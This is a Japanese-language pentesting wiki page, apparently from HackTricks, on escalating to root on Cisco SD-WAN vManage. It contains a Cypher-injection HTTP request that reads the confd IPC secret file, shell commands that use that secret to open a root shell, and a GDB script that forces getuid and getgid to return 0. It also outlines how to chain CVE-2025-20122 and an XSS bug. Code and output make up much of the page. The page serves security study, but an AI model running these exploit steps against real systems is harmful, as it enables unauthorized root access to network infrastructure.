# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

## パス 1

(例: [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

`confd` や各種バイナリに関連するいくつかの [documentation](http://66.218.245.39/doc/html/rn03re18.html) を少し調べたところ（Ciscoのウェブサイトのアカウントでアクセス可能）、IPCソケットを認証するために `/etc/confd/confd_ipc_secret` にあるシークレットを使用していることが分かりました：
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
先ほどの Neo4j インスタンスを覚えていますか？それは `vmanage` ユーザーの権限で実行されているため、先の脆弱性を利用してファイルを取得できます:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` プログラムはコマンドライン引数をサポートしていませんが、引数付きで `/usr/bin/confd_cli_user` を呼び出します。したがって、`/usr/bin/confd_cli_user` を自分の引数で直接呼び出すことができます。ただし、現状の権限ではそれを読み取れないため、rootfs から取得して scp でコピーし、help を確認してそれを使って shell を取得する必要があります:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## パス 2

(例: [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

synacktivチームによるブログ¹では、root shellを取得する巧妙な方法が説明されているが、注意点としてrootのみが読み取り可能な`/usr/bin/confd_cli_user`のコピーを入手する必要がある。私はそのような手間なしにrootへエスカレートする別の方法を見つけた。

私が`/usr/bin/confd_cli`バイナリを逆アセンブルしたところ、次のことが分かった:

<details>
<summary>UID/GIDの収集を示す Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

“ps aux” を実行すると、次のように表示されました (_注 -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
私は、“confd_cli”プログラムがログインユーザーから収集したユーザーIDとグループIDを“cmdptywrapper”アプリケーションに渡していると仮定した。

最初の試みでは“cmdptywrapper”を直接実行し`-g 0 -u 0`を渡したが、失敗した。途中でファイルディスクリプタ（-i 1015）がどこかで作成されているようで、それを偽装できなかった。

synacktiv’s blog(last example)で述べられているように、`confd_cli`プログラムはコマンドライン引数をサポートしていないが、デバッガで影響を与えることができ、幸いにもシステムに GDB が含まれている。

`getuid` と `getgid` API が 0 を返すよう強制する GDB スクリプトを作成した。すでに deserialization RCE によって“vmanage”権限を持っているので、`/etc/confd/confd_ipc_secret`を直接読み取る権限がある。

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
コンソール出力:

<details>
<summary>コンソール出力</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3（2025 CLI 入力検証バグ）

Cisco は vManage を *Catalyst SD-WAN Manager* に改名しましたが、基盤となる CLI は同じボックス上で引き続き動作します。2025 年のアドバイザリ（CVE-2025-20122）は、CLI の入力検証が不十分で、マネージャの CLI サービスに細工されたリクエストを送ることで **任意の認証済みローカルユーザー** が root を取得できると説明しています。任意の low-priv foothold（例：Path1 の Neo4j deserialization、または cron/backup ユーザのシェル）をこの脆弱性と組み合わせることで、`confd_cli_user` をコピーしたり GDB をアタッチしたりせずに root に昇格できます:

1. low-priv shell を使って CLI の IPC エンドポイントを特定します（通常は Path2 で示したポート 4565 の `cmdptywrapper` リスナー）。
2. UID/GID フィールドを 0 に偽装する CLI リクエストを作成します。検証バグにより元の呼び出し元の UID が強制されないため、wrapper は root 権限の PTY を起動します。
3. 偽装したリクエスト経由で任意のコマンド列（`vshell; id` など）をパイプし、root シェルを取得します。

> The exploit surface is local-only; remote code execution is still required to land the initial shell, but once inside the box exploitation is a single IPC message rather than a debugger-based UID patch.

## その他の最近の vManage/Catalyst SD-WAN Manager の連鎖可能な脆弱性

* **Authenticated UI XSS (CVE-2024-20475)** – 特定のインターフェイスフィールドに JavaScript を注入できます。管理者セッションを盗用すれば、ブラウザ駆動で `vshell` → ローカルシェル → Path3 と進んで root を取得する経路が得られます。

## References

- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)

{{#include ../../banners/hacktricks-training.md}}
